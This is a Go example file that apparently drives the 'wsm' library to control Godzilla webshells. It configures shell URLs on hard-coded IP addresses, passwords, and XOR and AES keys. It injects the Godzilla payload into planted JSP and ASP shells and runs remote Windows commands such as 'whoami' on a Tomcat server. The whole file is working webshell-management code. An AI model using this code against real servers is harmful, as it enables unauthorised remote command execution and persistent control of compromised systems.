package main

import (
	"fmt"
	"github.com/Go0p/wsm"
	"github.com/Go0p/wsm/lib/shell"
	"github.com/Go0p/wsm/lib/shell/godzilla"
	"log"
)

const (
	//JspShellUrl = "http://172.20.10.2:8080/bs64.jsp"
	//AspShellUrl = "http://139.196.175.86:8081/xorraw.asp"
	AspShellUrl  = "http://139.196.175.86:8081/xorbs64.asp"
	AspxShellUrl = "http://139.196.175.86:8081/bs64.aspx"
	JspShellUrl  = "http://139.196.175.86:8080/bs64.jsp"
)

func main() {
	log.SetFlags(log.Lshortfile)

	//testJsp()
	testAsp()
}

func testAsp() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      AspShellUrl,
			Password: "pass",
			Script:   shell.AspScript,
			Proxy:    "http://127.0.0.1:9999",
			// base64 的加密模式必须加上这个 header 头
			//Headers: map[string]string{"User-Agent": "xxxxxxxxxxxxxxxxxxxxx"},
			//Headers: map[string]string{"Content-type": "application/x-www-form-urlencoded"},
		},
		Key:      "key",
		Crypto:   godzilla.ASP_XOR_BASE64,
		Encoding: godzilla.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	g.InjectPayload()

	//isAlive := g.Ping(nil)
	//fmt.Println(isAlive)
	//basicInfo1 := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&echo 你好"`)
	//fmt.Println("Info : ", basicInfo1)

	//basicInfo := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&print 1"`)
	basicInfo := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&whoami /"`)
	fmt.Println("Info : ", basicInfo)
}

func testJsp() {
	info := &wsm.GodzillaInfo{
		BaseShell: wsm.BaseShell{
			Url:      JspShellUrl,
			Password: "pass",
			Script:   shell.JavaScript,
			Proxy:    "http://127.0.0.1:9999",
			// base64 的加密模式必须加上这个 header 头
			//Headers: map[string]string{"User-Agent": "xxxxxxxxxxxxxxxxxxxxx"},
			//Headers: map[string]string{"Content-type": "application/x-www-form-urlencoded"},
		},
		Key:      "key",
		Crypto:   godzilla.JAVA_AES_BASE64,
		Encoding: godzilla.UTF8CharSet,
	}
	g, err := wsm.NewGodzillaInfo(info)
	if err != nil {
		log.Println(err)
	}
	g.InjectPayload()

	//isAlive := g.Ping(nil)
	//fmt.Println(isAlive)
	//basicInfo1 := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&echo 你好"`)
	//fmt.Println("Info : ", basicInfo1)

	//basicInfo := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&print 1"`)
	basicInfo := g.CommandExec(`cmd /c "cd /d "D:/Jdk/apache-tomcat-7.0.109/bin/"&whoami /"`)
	fmt.Println("Info : ", basicInfo)
}
